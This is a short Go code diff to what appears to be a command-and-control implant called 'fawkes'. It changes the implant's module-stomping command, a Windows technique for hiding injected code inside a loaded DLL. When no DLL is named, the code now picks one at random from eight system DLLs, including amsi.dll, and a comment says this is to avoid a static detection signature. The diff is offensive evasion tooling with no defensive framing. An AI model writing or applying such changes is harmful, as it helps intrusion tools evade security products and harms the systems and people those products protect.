@@ -12,9 +12,11 @@ import (
 	"encoding/base64"
 	"encoding/json"
 	"fmt"
+	"math/rand"
 	"runtime"
 	"strings"
 	"syscall"
+	"time"
 	"unsafe"
 
 	"fawkes/pkg/structs"
@@ -79,7 +81,13 @@ func (c *ModuleStompingCommand) Execute(task structs.Task) structs.CommandResult
 	}
 
 	if params.DllName == "" {
-		params.DllName = "xpsservices.dll"
+		// Pick a random benign DLL — avoids a static signature on a single default
+		stompDLLs := []string{
+			"xpsservices.dll", "WININET.dll", "amsi.dll", "TextShaping.dll",
+			"msvcp_win.dll", "urlmon.dll", "dwrite.dll", "wintypes.dll",
+		}
+		r := rand.New(rand.NewSource(time.Now().UnixNano()))
+		params.DllName = stompDLLs[r.Intn(len(stompDLLs))]
 	}
 
 	var sb strings.Builder
